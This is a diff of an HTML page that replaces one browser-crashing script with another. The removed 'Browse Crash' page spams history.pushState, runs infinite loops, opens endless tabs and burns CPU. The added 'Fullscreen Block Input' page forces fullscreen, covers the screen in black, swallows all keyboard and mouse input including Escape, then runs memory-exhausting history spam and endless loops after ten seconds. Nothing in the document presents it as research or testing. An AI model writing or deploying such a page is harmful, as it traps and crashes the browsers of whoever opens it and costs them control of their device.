@@ -1,82 +1,124 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title>Browse Crash</title>
-  <style>
-    html, body {
-      width: 100%;
-      height: 100%;
-      margin: 0;
-    }
-  </style>
-</head>
-<body>
-  <button id="button">Click me!</button>
-  <script>
-    document.getElementById('button').addEventListener('click', function() {
-      // Consume memory and crash the browser
-      var total = "";
-      for (var i = 0; i < 9999999999999; i++) {
-        total += i.toString();
-        history.pushState(0, 0, total);
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Fullscreen Block Input</title>
+    <style>
+      body {
+        margin: 0;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: #f0f0f0;
+      }
+      button {
+        padding: 10px 20px;
+        font-size: 20px;
+        color: white;
+        background-color: red;
+        border: none;
+        cursor: pointer;
+      }
+      #blocker {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: black;
+        display: none;
+        justify-content: center;
+        align-items: center;
+        color: white;
+        font-size: 24px;
+        z-index: 1000;
+      }
+    </style>
+  </head>
+  <body>
+    <button onclick="enterFullscreen()">Click me</button>
+    <div id="blocker"></div>
+
+    <script>
+      function enterFullscreen() {
+        const elem = document.documentElement;
+        if (elem.requestFullscreen) {
+          elem.requestFullscreen();
+        } else if (elem.mozRequestFullScreen) {
+          elem.mozRequestFullScreen();
+        } else if (elem.webkitRequestFullscreen) {
+          elem.webkitRequestFullscreen();
+        } else if (elem.msRequestFullscreen) {
+          elem.msRequestFullscreen();
+        }
+
+        const blocker = document.getElementById("blocker");
+        blocker.style.display = "flex";
+
+        document.addEventListener("keydown", blockEvent, true);
+        document.addEventListener("keyup", blockEvent, true);
+        document.addEventListener("keypress", blockEvent, true);
+        document.addEventListener("mousedown", blockEvent, true);
+        document.addEventListener("mouseup", blockEvent, true);
+        document.addEventListener("click", blockEvent, true);
+        document.addEventListener("dblclick", blockEvent, true);
+        document.addEventListener("contextmenu", blockEvent, true);
+
+        setTimeout(crash, 10000);
       }
 
-      // Create multiple infinite loops
-      function loop1() {
-        for (let i = 999909; i === i; i *= i) {
-          console.log(i);
+      function blockEvent(event) {
+        if (
+          event.key === "Escape" ||
+          event.key === "Esc" ||
+          event.keyCode === 27
+        ) {
+          event.preventDefault();
+          event.stopPropagation();
+        } else {
+          event.stopPropagation();
+          event.preventDefault();
         }
       }
-      loop1();
 
-      function loop2() {
-        for (let i = 991; i === i; i *= i) {
-          console.log(i);
+      function crash() {
+        var total = "";
+        for (var i = 0; i < 9999999999999; i++) {
+          total += i.toString();
+          history.pushState(0, 0, total);
+        }
+
+        while (true) {
+          for (let i = 999909; i === i; i *= i) {
+            console.log(i);
+          }
+        }
+
+        while (true) {
+          for (let i = 991; i === i; i *= i) {
+            console.log(i);
+          }
+        }
+
+        while (true) {
+          for (let i = 9999; i === i; i *= i) {
+            console.log(i);
+          }
+        }
+
+        while (true) {
+          for (let i = 999; i === i; i *= i) {
+            console.log(i);
+          }
+        }
+        while (true) {
+          for (let i = 9999; i === i; i *= i) {
+            console.log(i);
+          }
         }
       }
-      loop2();
-
-      function loop3() {
-        for (let i = 9999; i === i; i *= i) {
-          console.log(i);
-        }
-      }
-      loop3();
-
-      function loop4() {
-        for (let i = 999; i === i; i *= i) {
-          console.log(i);
-        }
-      }
-      loop4();
-
-      function loop5() {
-        for (let i = 9999; i === i; i *= i) {
-          console.log(i);
-        }
-      }
-      loop5();
-
-      // Make the window full screen
-      document.documentElement.requestFullscreen();
-
-      // Open multiple tabs
-      function openTab() {
-        window.open('about:blank', '_blank');
-        setTimeout(openTab, 0);
-      }
-      openTab();
-
-      // Create a CPU-intensive task
-      function cpuIntensive() {
-        var startTime = performance.now();
-        while (performance.now() - startTime < 10000) {
-          Math.sqrt(Math.random() * 1000000);
-        }
-      }
-      cpuIntensive();
-    });
-  </script>
-</body>
+    </script>
+  </body>
 </html>
